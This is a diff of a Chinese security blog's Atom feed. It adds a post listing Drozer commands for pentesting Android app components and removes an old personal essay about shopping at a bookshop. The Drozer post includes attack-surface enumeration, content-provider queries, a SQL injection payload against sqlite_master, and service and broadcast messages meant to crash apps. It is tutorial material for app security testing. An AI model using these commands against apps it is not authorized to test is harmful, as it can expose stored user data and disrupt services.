@@ -5,10 +5,40 @@
   <link href="http://www.lewisec.com/atom.xml" rel="self"/>
   
   <link href="http://www.lewisec.com/"/>
-  <updated>2017-06-13T14:49:29.754Z</updated>
+  <updated>2017-07-24T05:09:26.369Z</updated>
   <id>http://www.lewisec.com/</id>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Pentest_Android_APP_with_Drozer</title>
+    <link href="http://www.lewisec.com/2017/07/24/Pentest-Android-APP-with-Drozer/"/>
+    <id>http://www.lewisec.com/2017/07/24/Pentest-Android-APP-with-Drozer/</id>
+    <published>2017-07-24T04:02:36.000Z</published>
+    <updated>2017-07-24T05:09:26.369Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近在学习Android的渗透测试，当然，不是挖掘Android系统的漏洞，而是对Android下的各种APP进行渗透测试。<br>本文根据各种资料，整理出使用Drozer工具分析Android APP四大组件的安全性的方法。</p>
+<p>Drozer工具的简介与安装步骤，可通过Google搜索，本文不再赘述。</p>
+<a id="more"></a>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- run app.package.list -f manu                            ##搜索包含指定字符的包名</div><div class="line">- run app.package.info -a com.AAAAA.move   ##列出该包的详细信息</div><div class="line">- run app.package.attacksurface com.AAAAA.move   ##列出所有攻击面，也就是四大组件的暴露情况</div></pre></td></tr></table></figure>
+<h3 id="攻击content-provider"><a href="#攻击content-provider" class="headerlink" title="攻击content provider"></a>攻击content provider</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">- run app.provider.info -a com.AAAAA.move    ##列出该包所有的content provider</div><div class="line">- run app.provider.finduri com.AAAAA.move    ##查找所有content provider的URI</div><div class="line">- run app.provider.query content://com.snda.youmi.providers.data/contents/ -- vertical  ##查看这个content的内容</div><div class="line">- run app.provider.query content://com.snda.youmi.providers.data/contents --projection &quot;phone_number&quot;  ##查看数据库内容</div><div class="line">- run scanner.provider.injection -a com.AAAAA.move  ##扫描content provider是否存在注入漏洞</div><div class="line">- run scanner.provider.traversal -a com.AAAAA.move  ##扫描content provider是否存在文件遍历漏洞</div><div class="line">- run app.provider.query  content://com.snda.youmi.providers.data/contents/ --projection &quot;&apos;&quot;   ##手工检测注入</div><div class="line">- run app.provider.query content://com.snda.youmi.providers.data/contents/ --projection &quot;* from sqlite_master where type=&apos;table&apos;;--&quot; --vertical ##实际注入</div></pre></td></tr></table></figure>
+<h3 id="攻击activity"><a href="#攻击activity" class="headerlink" title="攻击activity"></a>攻击activity</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">- run app.activity.info -a com.AAAAA.move   ##列出该包所有的activity</div><div class="line">- run app.activity.start --component com.AAAAA.move com.AAAAA.core.ui.InitialActivity   ##启动这个包的这个activity</div></pre></td></tr></table></figure>
+<h3 id="攻击service"><a href="#攻击service" class="headerlink" title="攻击service"></a>攻击service</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">- run app.service.info -a  com.AAAAA.move  ##列出这个包的所有的service</div><div class="line">- run app.service.send com.AAAAA.move com.salesforce.androidsdk.auth.AuthenticatorService --msg 1 5 3  ##向这个包的这个service发消息，有可能导致app crash，形成本地拒绝服务</div></pre></td></tr></table></figure>
+<h3 id="攻击broadcast-receiver"><a href="#攻击broadcast-receiver" class="headerlink" title="攻击broadcast receiver"></a>攻击broadcast receiver</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">- run app.broadcast.info -a com.AAAAA.move   ##列出这个包的所有broadcast</div><div class="line">- run app.broadcast.send --component com.AAAAA.move com.AAAAA.move3.notification.receiver.NotificationRecevier  ##给这个包的这个broadcast发消息，有可能导致app crash，形成本地拒绝服务</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近在学习Android的渗透测试，当然，不是挖掘Android系统的漏洞，而是对Android下的各种APP进行渗透测试。&lt;br&gt;本文根据各种资料，整理出使用Drozer工具分析Android APP四大组件的安全性的方法。&lt;/p&gt;
+&lt;p&gt;Drozer工具的简介与安装步骤，可通过Google搜索，本文不再赘述。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全相关" scheme="http://www.lewisec.com/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
+    
+    
+      <category term="安全" scheme="http://www.lewisec.com/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>透过F5获取服务器真实内网IP</title>
@@ -1024,39 +1054,6 @@
     
       &lt;p&gt;昨天在电影院看完《夏洛特烦恼》，今天在家看完《十二公民》，瞬间感觉电影票钱奉献错了。&lt;/p&gt;
 &lt;p&gt;不是说《夏洛特烦恼》有多不好，而是像《十二公民》这样的好片子，应该得到高票房和高度认可。所以写下这篇不算影评的文字。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="七零八落" scheme="http://www.lewisec.com/categories/%E4%B8%83%E9%9B%B6%E5%85%AB%E8%90%BD/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>逛书店</title>
-    <link href="http://www.lewisec.com/2015/08/16/bookshop/"/>
-    <id>http://www.lewisec.com/2015/08/16/bookshop/</id>
-    <published>2015-08-16T02:59:44.000Z</published>
-    <updated>2016-08-06T16:04:21.892Z</updated>
-    
-    <content type="html"><![CDATA[<p>公司发福利，200多元的购书券，指定在新华书店购书中心消费。刚拿到购书券的时候，我其实是高兴的。每年买书至少十几本，有了购书券至少可以剩下一笔钱嘛。</p>
-<p>上次进书店还是三年前，坐火车回家之前有大块空余时间，一个人溜达到附近的购书中心打发时光，然后发现了讲ISO27001的那本指南，如获至宝。那本书给我后来的工作帮助不小，不过最后我还是在网上下的单。</p>
-<p>昨天体验了一次实体店购书，着实把我累够呛，我也理解了为什么电商对书店的冲击这么大。</p>
-<a id="more"></a>
-<p>在实体店买书巨累！<br>实体店越来越少，去一次来回坐车都要一个多小时，三十多度的高温考验着买书的决心。网购的话，点点鼠标就ok。这种便利性是影响我去实体店买书的首要原因。</p>
-<p>在实体店找书巨累！<br>上下五层，要找自己想要的书，先去查询机搜。还只能按书名搜。搜出来只告诉一个书架编号，得自己跑着找这个架子。你就不能给个平面示意图吗？那么多架子，编号还印刷的小，找到也是够费劲！</p>
-<p>在实体店买自己想要的书巨难！<br>查询系统只能按书名搜，输入《论中国》，结果出来一堆XXX论中国XXX的结果，超出50条的部分还不予显示。购书单上至少有三本书店压根就没有货。习惯了网购便利快捷的搜索，这种体验实在让人崩溃。</p>
-<p>如果你不是有目的购书，习惯于在书店逡巡，随便拿一本翻翻就买买买的感性消费者，书店还是有自己的便利。但对于我这种目标性非常明确，拿着购书单去买书的人来讲，去实体店买书就是自己找罪受。</p>
-<p>书店生意显然不容乐观，有些柜台已经改为了运动服饰品牌店。童书楼层还开辟一大块面积租给了卖学习机的、卖儿童书桌的店面。书店客流量不算小，但收银台却压根不需要排队。说白了，看的人多买的人少呗。没有桌椅就席地而坐，没有咖啡就自带水杯。还有家长带着孩子去读绘本的，注意，是读。我多想提醒他们，其实有个地方，叫做图书馆。</p>
-<p>也许，以后女儿大了，我也会带她去书店。不过不是让她去蹭书看。那种人人看书、人人喜欢书的氛围是电商永远也给不了的。各类包装精美的书摆在眼前，总会有一种买买买的冲动。我希望这样可以培养孩子爱上阅读的习惯。给她两百块钱，陪着她逛逛，由着她随便拿几本有眼缘的书回家，这就够了。至于书的质量是不是足够好，内容是不是足够优秀，这倒是其次。不多看点烂书，哪能锻炼出来找好书的本事呢。不翻翻不同类型的书，哪能找准自己的口味呢。</p>
-<p>所以，希望书店坚持开下去！开的更好！</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;公司发福利，200多元的购书券，指定在新华书店购书中心消费。刚拿到购书券的时候，我其实是高兴的。每年买书至少十几本，有了购书券至少可以剩下一笔钱嘛。&lt;/p&gt;
-&lt;p&gt;上次进书店还是三年前，坐火车回家之前有大块空余时间，一个人溜达到附近的购书中心打发时光，然后发现了讲ISO27001的那本指南，如获至宝。那本书给我后来的工作帮助不小，不过最后我还是在网上下的单。&lt;/p&gt;
-&lt;p&gt;昨天体验了一次实体店购书，着实把我累够呛，我也理解了为什么电商对书店的冲击这么大。&lt;/p&gt;
     
     </summary>
     
